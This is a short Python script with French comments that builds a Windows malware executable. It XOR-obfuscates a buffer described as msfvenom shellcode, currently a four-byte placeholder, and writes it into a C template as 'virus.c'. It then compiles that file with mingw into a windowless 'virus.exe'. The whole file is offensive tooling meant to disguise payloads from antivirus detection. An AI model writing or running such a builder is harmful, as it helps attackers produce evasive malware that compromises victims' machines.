#!/usr/bin/env python3

import os

# Buffer généré par msfvenom
original_buffer = b"\xde\xad\xbe\xef"
buffer_len = len(original_buffer)

# Obfusce le buffer
buffer = []
for i in range(buffer_len):
    buffer.append(chr(original_buffer[i] ^ 42))

# Transforme le buffer en string C
buffer_string = "".join(["\\x%02x" % ord(b) for b in buffer])

# Génère le code C à partir de base.c en remplaçant <BUF> et <BUFLEN>
with open("base.c", "r", encoding="utf-8") as base_file:
    base = base_file.read()
    replaced = base.replace("<BUF>", buffer_string).replace(
        "<BUFLEN>", str(buffer_len))
    with open("virus.c", "w", encoding="utf-8") as output_file:
        output_file.write(replaced)

# Compilation du code généré en .exe
os.system("x86_64-w64-mingw32-gcc -mwindows -Wall virus.c -o virus.exe")
